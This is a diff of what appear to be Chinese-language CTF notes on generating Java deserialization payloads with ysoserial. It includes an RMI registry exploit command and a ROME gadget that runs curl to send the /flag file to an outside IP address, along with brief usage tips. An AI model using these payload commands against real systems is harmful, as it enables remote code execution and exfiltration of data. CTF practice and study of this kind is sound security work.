@@ -16,9 +16,9 @@ nc 10.10.10.10 1099 < groovypayload.bin
 java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
 
 java -jar ysoserial.jar ROME "curl http://1.2.90.186:1234 -d @/flag" |base64
-`-d @/flag`：`-d`选项告诉`curl`要发送一个POST请求，并且指定了要发送的数据。
-`@`符号后面跟着的是一个文件路径，`/flag`表示要发送的数据位于当前目录下的`flag`文件中。
-`curl`会读取这个文件的内容，并将其作为POST请求的数据发送到服务器。
+POST请求的数据体读/flag文件发送到服务器。
+ 
+|base64在windows用不了。可以使用图像化版、python、BP插件java DeserializationScanner 导出base64的payload。
 ```
 
 ^
